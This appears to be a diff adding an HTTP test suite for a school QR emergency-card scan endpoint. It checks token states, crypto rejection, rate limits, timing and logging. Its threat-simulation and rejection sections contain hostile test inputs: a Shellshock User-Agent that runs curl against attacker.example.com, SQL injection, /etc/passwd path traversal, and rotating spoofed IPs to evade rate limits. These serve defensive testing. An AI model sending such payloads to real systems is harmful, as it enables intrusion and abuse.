@@ -1,0 +1,639 @@
+### =============================================================================
+### scan.http — RESQID
+### Complete test suite for GET /s/:code — public QR scan endpoint
+###
+### QUICK START (3 steps):
+###   1. node tests/seed.scan.js
+###   2. Copy the @variable block it prints into the section below
+###   3. Run requests — in VS Code: install "REST Client" by Huachao Mao
+###
+### To reset and get fresh codes:
+###   node tests/seed.scan.js --regen
+###
+### To clean up after testing:
+###   node tests/seed.scan.js --clean
+### =============================================================================
+
+@BASE_URL = http://localhost:3000
+@SCAN_PATH = /s
+
+# ── PASTE SEED SCRIPT OUTPUT BELOW THIS LINE ──────────────────────────────────
+# Run: node tests/seed.scan.js
+# Then copy the printed block here and save the file.
+
+@VALID_CODE           = paBzheHwIcvnUzqYUkMG9HbuUcL5CRrADNp47BtckaY
+@MINIMAL_VIS_CODE     = MHMeLMjzMyNZUnQXQxEd79CHnpwMGNllBaE8HEYw4P7
+@HIDDEN_VIS_CODE      = TsGuidlLKqsIfLWgj4OdEmfcsomIbx929Wi96MEczXa
+@UNASSIGNED_CODE      = paBzheHwIcvnUzqYUkMG9HbuUcL5CRrADNp47BtckaY
+@ISSUED_CODE          = HjHAqQzGgYCY2qxRv1aUdkZYgw0wqErfJS2XdFILUW0
+@INACTIVE_CODE        = TB3WnkjxP5oYiDZvZhpoo3mKLZqSTFIcFjbdmnzR9UE
+@REVOKED_CODE         = RcxhRm14FdwgT4QgCLR6EYjEjrI1MGisfOJh2xa2Cr0
+@EXPIRED_CODE         = yP9X1sF7Lm0uIiBYCEE6S69yN3KJFC9ktoFZPrFBiC0
+@NO_PROFILE_CODE      = 8RmIJUsudiUTdSP0jcYX7FltOh7QRGFry248xy03XqB
+@NON_EXISTENT_CODE    = DKnhmImBdv5jBHNelRatQqDjkkxPrfJA9Ju58RJibHr
+
+# ── END PASTE BLOCK ───────────────────────────────────────────────────────────
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [A] HAPPY PATH — ACTIVE token, all 3 visibility levels
+### Expected for all: HTTP 200, state="ACTIVE"
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [A-1] PUBLIC visibility — full emergency profile
+# CHECK: profile has blood_group, allergies, conditions, medications,
+#        doctor { name, phone }, notes, contacts[] with decrypted phones
+#        school has name + logo_url + phone + address
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.10
+Accept: application/json
+
+###
+
+# [A-2] MINIMAL visibility — name + photo + primary_contact only
+# CHECK: profile has NO blood_group, allergies, conditions
+#        profile.primary_contact.phone is a real phone number (decrypted)
+#        profile has NO contacts[] array
+GET {{BASE_URL}}{{SCAN_PATH}}/{{MINIMAL_VIS_CODE}}
+User-Agent: Mozilla/5.0 (Android 14) ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.11
+Accept: application/json
+
+###
+
+# [A-3] HIDDEN visibility — name + class only, nothing else
+# CHECK: profile has NO contacts, NO medical, NO photo
+#        school is safeSchoolFull (phone + address present — card is live)
+GET {{BASE_URL}}{{SCAN_PATH}}/{{HIDDEN_VIS_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.12
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [B] TOKEN STATES — one per status, verify exact response shape
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [B-1] UNASSIGNED — card not yet registered by parent
+# CHECK: state="UNREGISTERED"
+#        nonce present (32-char hex string)
+#        nonceExpiresAt ≈ now + 15 min
+#        school is safeSchoolFull (phone + address visible)
+GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.20
+Accept: application/json
+
+###
+
+# [B-1b] UNASSIGNED — scan again immediately (nonce deduplication test)
+# CHECK: nonce value is IDENTICAL to B-1 — not a new value
+#        Run: SELECT COUNT(*) FROM "RegistrationNonce" WHERE token_id='<id>'
+#        Must be 1 — not 2
+GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.20
+Accept: application/json
+
+###
+
+# [B-2] ISSUED — linked to student, not yet activated by family
+# CHECK: state="ISSUED"
+#        school present, no profile, no nonce
+GET {{BASE_URL}}{{SCAN_PATH}}/{{ISSUED_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.21
+Accept: application/json
+
+###
+
+# [B-3] INACTIVE — temporarily disabled
+# CHECK: state="INACTIVE"
+#        school is safeSchoolFull (reversible state — card may return)
+GET {{BASE_URL}}{{SCAN_PATH}}/{{INACTIVE_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.22
+Accept: application/json
+
+###
+
+# [B-4] REVOKED — permanently cancelled ← KEY SECURITY CHECK
+# CHECK: state="REVOKED"
+#        school has ONLY { name } — NO phone, NO address, NO logo_url
+#        This is safeSchoolMinimal [FIX-3 service]
+#        Verify by inspecting response body carefully
+GET {{BASE_URL}}{{SCAN_PATH}}/{{REVOKED_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.23
+Accept: application/json
+
+###
+
+# [B-5] EXPIRED — past expires_at date
+# CHECK: state="EXPIRED"
+#        school has ONLY { name } — NO phone, NO address [FIX-3 service]
+#        message mentions renewing with school
+GET {{BASE_URL}}{{SCAN_PATH}}/{{EXPIRED_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.24
+Accept: application/json
+
+###
+
+# [B-6] NO_PROFILE — ACTIVE token but student.is_active=false
+# CHECK: state="NO_PROFILE"
+#        school present (safeSchoolFull)
+#        no profile block
+GET {{BASE_URL}}{{SCAN_PATH}}/{{NO_PROFILE_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 203.0.113.25
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [C] CRYPTO REJECTION — all must be rejected without touching DB
+###     Watch your DB query log — none of these should produce a Token lookup
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [C-1] Old 28-char format (previous HMAC-injection scheme)
+# EXPECTED: HTTP 400 — route regex rejects before controller runs
+GET {{BASE_URL}}{{SCAN_PATH}}/5YbX2mKqf3AB9xP9nRtL3vWcUjAe
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+###
+
+# [C-2] 42 chars — one short of 43
+# EXPECTED: HTTP 400
+GET {{BASE_URL}}{{SCAN_PATH}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+###
+
+# [C-3] 44 chars — one too long
+# EXPECTED: HTTP 400
+GET {{BASE_URL}}{{SCAN_PATH}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+###
+
+# [C-4] Invalid chars (hyphen) — correct length but bad alphabet
+# EXPECTED: HTTP 400 — route regex rejects non-alphanumeric
+GET {{BASE_URL}}{{SCAN_PATH}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA-
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+###
+
+# [C-5] All zeros — 43 chars, valid base62, passes regex
+# EXPECTED: HTTP 200, state="INVALID" — AES-SIV auth tag mismatch
+#           Verify NO DB query fired (check pg_stat_activity or query logs)
+GET {{BASE_URL}}{{SCAN_PATH}}/0000000000000000000000000000000000000000000
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 192.0.2.1
+Accept: application/json
+
+###
+
+# [C-6] All uppercase A — 43 chars, valid base62
+# EXPECTED: HTTP 200, state="INVALID"
+GET {{BASE_URL}}{{SCAN_PATH}}/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 192.0.2.2
+Accept: application/json
+
+###
+
+# [C-7] Valid code for a UUID that doesn't exist in Token table
+# (seed script prints this as @NON_EXISTENT_CODE)
+# EXPECTED: HTTP 200, state="INVALID"
+#           DB IS queried (crypto passes), but findUnique returns null
+#           ScanLog written with sentinel school_id [FIX-4 service]
+GET {{BASE_URL}}{{SCAN_PATH}}/{{NON_EXISTENT_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 192.0.2.3
+Accept: application/json
+
+###
+
+# [C-8] Empty segment
+# EXPECTED: HTTP 404 from Express (no route matches)
+GET {{BASE_URL}}{{SCAN_PATH}}/
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+###
+
+# [C-9] SQL injection — rejected by route regex (bad chars)
+# EXPECTED: HTTP 400
+GET {{BASE_URL}}{{SCAN_PATH}}/' OR '1'='1
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+###
+
+# [C-10] Path traversal
+# EXPECTED: HTTP 400 or 404
+GET {{BASE_URL}}{{SCAN_PATH}}/../../../etc/passwd
+User-Agent: ResQidScanner/1.0
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [D] RATE LIMITING — three independent layers
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [D-1] IP rate limit — publicEmergencyLimiter (10/min per IP)
+# HOW TO TEST: In VS Code REST Client, right-click → "Send All Requests"
+#              on this block (repeat it 11 times manually or use a script)
+# EXPECTED: Requests 1–10 → HTTP 200
+#           Request 11    → HTTP 429 "Too many requests — please slow down"
+#           requestId present in 429 body
+# CONFIRMS: redis.sendCommand fix [FIX-1 rateLimit] — was broken before
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 10.0.0.100
+Accept: application/json
+
+###
+
+# [D-2] Per-token rate limit — perTokenScanLimit (20/hr per scan code)
+# HOW TO TEST: Use a different IP from D-1 (so IP limit doesn't interfere)
+#              Send 21 times. Each time a different XFF to bypass IP limit.
+# EXPECTED: Requests 1–20 → HTTP 200
+#           Request 21    → HTTP 429 "This QR code has been scanned too many times"
+# CONFIRMS: req.params.code fix [FIX-2 rateLimit] — was req.params.token before
+# VERIFY:   SELECT * FROM "ScanRateLimit" WHERE identifier = '<VALID_CODE_VALUE>'
+#             AND identifier_type = 'TOKEN';
+#           Should have a row with blocked_until set
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 10.0.1.1
+Accept: application/json
+
+###
+
+# [D-3] Persistent IP block — checkIpBlocked (DB-backed)
+# SETUP: Run this SQL first:
+#   INSERT INTO "ScanRateLimit"
+#     (id, identifier, identifier_type, count, window_start, last_hit,
+#      blocked_until, blocked_reason, block_count)
+#   VALUES
+#     (gen_random_uuid(), '172.16.0.99', 'IP', 25, now(), now(),
+#      now() + interval '1 hour', 'Manual test block', 1)
+#   ON CONFLICT (identifier, identifier_type) DO UPDATE
+#     SET blocked_until = now() + interval '1 hour';
+#
+# EXPECTED: HTTP 403 "IP address is temporarily blocked"
+# CONFIRMS: checkIpBlocked fires BEFORE publicEmergencyLimiter (first in chain)
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 172.16.0.99
+Accept: application/json
+
+###
+
+# [D-4] Rate limit is per-IP — different IPs should all succeed independently
+# All three should return HTTP 200 (each IP has its own Redis window)
+# If any returns 429: rate limit is global (bug)
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 198.51.100.1
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 198.51.100.2
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 198.51.100.3
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [E] TIMING ORACLE — both paths must take ≥ 100ms
+###
+### Measure response time shown by REST Client (bottom of response panel)
+### or use: curl -o /dev/null -s -w "%{time_total}\n" <url>
+###
+### PASS:  Both E-1 and E-2 are ≥ 0.100s and within ~50ms of each other
+### FAIL:  E-1 (INVALID) is ~0.001s and E-2 (ACTIVE) is ~0.015s
+###        → timing oracle still open, MIN_RESPONSE_MS floor not working
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [E-1] INVALID path — pure crypto, no DB (~1ms without fix, ≥100ms with fix)
+GET {{BASE_URL}}{{SCAN_PATH}}/0000000000000000000000000000000000000000000
+User-Agent: TimingTest/1.0
+X-Forwarded-For: 192.0.2.50
+Accept: application/json
+
+###
+
+# [E-2] ACTIVE path — crypto + DB + profile build (~15ms without fix, ≥100ms with fix)
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: TimingTest/1.0
+X-Forwarded-For: 192.0.2.51
+Accept: application/json
+
+###
+
+# [E-3] REVOKED path — crypto + DB, no profile build
+GET {{BASE_URL}}{{SCAN_PATH}}/{{REVOKED_CODE}}
+User-Agent: TimingTest/1.0
+X-Forwarded-For: 192.0.2.52
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [F] SCAN LOG + DB INTEGRITY
+### After each: SELECT * FROM "ScanLog" ORDER BY created_at DESC LIMIT 1;
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [F-1] Tampered code — ScanLog sentinel UUID check
+# EXPECTED DB row after this request:
+#   token_id  = '00000000-0000-0000-0000-000000000000'
+#   school_id = '00000000-0000-0000-0000-000000000000'
+#   result    = 'INVALID'
+# CONFIRMS: [FIX-4 service] — was crashing with FK error ("unknown" ≠ UUID)
+GET {{BASE_URL}}{{SCAN_PATH}}/ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ1
+User-Agent: ScanLogTest/1.0
+X-Forwarded-For: 192.0.2.60
+Accept: application/json
+
+###
+
+# [F-2] Nonexistent UUID — sentinel school_id check
+# EXPECTED DB row:
+#   token_id  = <the real decoded UUID — exists in ScanLog>
+#   school_id = '00000000-0000-0000-0000-000000000000'
+#   result    = 'INVALID'
+GET {{BASE_URL}}{{SCAN_PATH}}/{{NON_EXISTENT_CODE}}
+User-Agent: ScanLogTest/1.0
+X-Forwarded-For: 192.0.2.61
+Accept: application/json
+
+###
+
+# [F-3] REVOKED — verify school field leak is closed
+# EXPECTED response: school = { name: "ResQid Test School" }
+# MUST NOT contain: phone, address, logo_url
+# If any of those appear → safeSchoolMinimal not used [FIX-3 service]
+GET {{BASE_URL}}{{SCAN_PATH}}/{{REVOKED_CODE}}
+User-Agent: ScanLogTest/1.0
+X-Forwarded-For: 192.0.2.62
+Accept: application/json
+
+###
+
+# [F-4] Blood group format check
+# EXPECTED: profile.blood_group = "B+" (seed sets B_POS)
+# WRONG:    "BPOS" or "B_POS" or "B POS"
+# CONFIRMS: formatBloodGroup fix [FIX-6 service]
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ScanLogTest/1.0
+X-Forwarded-For: 192.0.2.63
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [G] EDGE CASES
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [G-1] No User-Agent header (embedded kiosk scanners)
+# EXPECTED: HTTP 200, normal response, ScanLog.user_agent = null
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+X-Forwarded-For: 192.0.2.70
+Accept: application/json
+
+###
+
+# [G-2] Unusual but valid User-Agent
+# EXPECTED: HTTP 200, stored as-is in ScanLog
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQid-Kiosk/2.1 (Raspberry-Pi; Linux armv7l; GPIO-Scanner)
+X-Forwarded-For: 192.0.2.71
+Accept: application/json
+
+###
+
+# [G-3] Geo headers (future GPS support)
+# EXPECTED: HTTP 200, server may or may not capture these yet
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 192.0.2.72
+X-Geo-Latitude: 22.5726
+X-Geo-Longitude: 88.3639
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [H] THREAT SIMULATION — real attack patterns
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [H-1] Token enumeration — sequential guesses
+# EXPECTED: all HTTP 200, state="INVALID"
+# KEY CHECK: Watch your PostgreSQL query log (log_min_duration_statement=0)
+#            Zero Token table queries should fire for these
+#            Confirms: AES-SIV rejects in pure crypto before DB
+GET {{BASE_URL}}{{SCAN_PATH}}/1111111111111111111111111111111111111111111
+User-Agent: python-requests/2.31.0
+X-Forwarded-For: 185.220.101.1
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/2222222222222222222222222222222222222222222
+User-Agent: python-requests/2.31.0
+X-Forwarded-For: 185.220.101.1
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefg
+User-Agent: python-requests/2.31.0
+X-Forwarded-For: 185.220.101.1
+Accept: application/json
+
+###
+
+# [H-2] Nonce flood — scan UNASSIGNED card 5 times
+# EXPECTED: identical nonce in all 5 responses
+# VERIFY:   SELECT COUNT(*) FROM "RegistrationNonce"
+#             WHERE token_id = (SELECT id FROM "Token"
+#               WHERE school_id = (SELECT id FROM "School" WHERE code='RQ-TEST-SCAN')
+#               AND status = 'UNASSIGNED');
+#           Count must be 1 regardless of how many times you run this
+GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
+User-Agent: FloodTest/1.0
+X-Forwarded-For: 185.220.101.2
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
+User-Agent: FloodTest/1.0
+X-Forwarded-For: 185.220.101.2
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
+User-Agent: FloodTest/1.0
+X-Forwarded-For: 185.220.101.2
+Accept: application/json
+
+###
+
+# [H-3] Distributed botnet — same code, rotating IPs (bypasses IP limit)
+# EXPECTED: requests 1-20 succeed; request 21+ → HTTP 429 (per-token limit)
+# Each IP is under 10/min, but the token counter is shared across all IPs
+# CONFIRMS: perTokenScanLimit keys on scan CODE, not IP
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: Botnet/1.0
+X-Forwarded-For: 10.10.10.1
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: Botnet/1.0
+X-Forwarded-For: 10.10.10.2
+Accept: application/json
+
+###
+
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: Botnet/1.0
+X-Forwarded-For: 10.10.10.3
+Accept: application/json
+
+###
+
+# [H-4] XFF spoofing — attacker claims localhost
+# EXPECTED: ScanLog.ip_address must NOT be 127.0.0.1
+#           extractIp() should read the rightmost trusted proxy, not leftmost
+# VERIFY:   SELECT ip_address FROM "ScanLog" ORDER BY created_at DESC LIMIT 1;
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ResQidScanner/1.0
+X-Forwarded-For: 127.0.0.1, 10.0.0.1, 203.0.113.200
+Accept: application/json
+
+###
+
+# [H-5] Shellshock / command injection in User-Agent
+# EXPECTED: HTTP 200, UA saved as plain string in ScanLog
+#           Server must NOT make any outbound HTTP request
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: () { :;}; curl http://attacker.example.com/pwned
+X-Forwarded-For: 192.0.2.90
+Accept: application/json
+
+###
+
+# [H-6] Oversized User-Agent (log injection / buffer probe)
+# EXPECTED: HTTP 200 or HTTP 413 depending on header size limit config
+#           Must NOT crash the server
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+X-Forwarded-For: 192.0.2.91
+Accept: application/json
+
+###
+
+# [H-7] Tor exit node simulation
+# EXPECTED: HTTP 403 if ipReputation blocklist includes this range
+#           HTTP 200 if not yet in blocklist
+# NOTE: 185.220.100.x is a real Tor exit range — add to ipReputation
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: Mozilla/5.0
+X-Forwarded-For: 185.220.100.252
+Accept: application/json
+
+
+###
+### ═══════════════════════════════════════════════════════════════════════════
+### [I] EXACT RESPONSE SHAPES — for frontend/PWA contract verification
+### ═══════════════════════════════════════════════════════════════════════════
+
+# [I-1] ACTIVE / PUBLIC — full shape
+# Expected:
+# {
+#   "success": true,
+#   "message": "Scan resolved",
+#   "data": {
+#     "state": "ACTIVE",
+#     "profile": {
+#       "name": "TEST_active_public ResQid",
+#       "photo_url": null,
+#       "class": "10",
+#       "section": "A",
+#       "gender": "MALE",
+#       "visibility": "PUBLIC",
+#       "blood_group": "B+",
+#       "allergies": "Penicillin, Dust mites",
+#       "conditions": "Mild asthma",
+#       "medications": "Salbutamol inhaler",
+#       "doctor": { "name": "Dr. Priya Sharma", "phone": "+91-9000000099" },
+#       "notes": "Keep inhaler accessible at all times.",
+#       "contacts": [
+#         { "name": "Ramesh Kumar", "phone": "+91-9000000011", ... },
+#         { "name": "Sunita Kumar", "phone": "+91-9000000012", ... }
+#       ]
+#     },
+#     "school": {
+#       "name": "ResQid Test School",
+#       "logo_url": "https://resqid.in/test-assets/logo.png",
+#       "phone": "+91-9000000001",
+#       "address": "12 Test Lane, Kolkata"
+#     }
+#   }
+# }
+GET {{BASE_URL}}{{SCAN_PATH}}/{{VALID_CODE}}
+User-Agent: ShapeTest/1.0
+X-Forwarded-For: 192.0.2.80
+Accept: application/json
+
+###
+
+# [I-2] REVOKED — minimal school shape
+# Expected school object: { "name": "ResQid Test School" }
+# Must NOT contain: phone, address, logo_url
+GET {{BASE_URL}}{{SCAN_PATH}}/{{REVOKED_CODE}}
+User-Agent: ShapeTest/1.0
+X-Forwarded-For: 192.0.2.81
+Accept: application/json
+
+###
+
+# [I-3] UNREGISTERED — nonce shape
+# Expected:
+# {
+#   "data": {
+#     "state": "UNREGISTERED",
+#     "nonce": "<32 hex chars>",
+#     "nonceExpiresAt": "<ISO datetime ≈ now+15min>",
+#     "school": { name, logo_url, phone, address },
+#     "message": "..."
+#   }
+# }
+GET {{BASE_URL}}{{SCAN_PATH}}/{{UNASSIGNED_CODE}}
+User-Agent: ShapeTest/1.0
+X-Forwarded-For: 192.0.2.82
+Accept: application/json
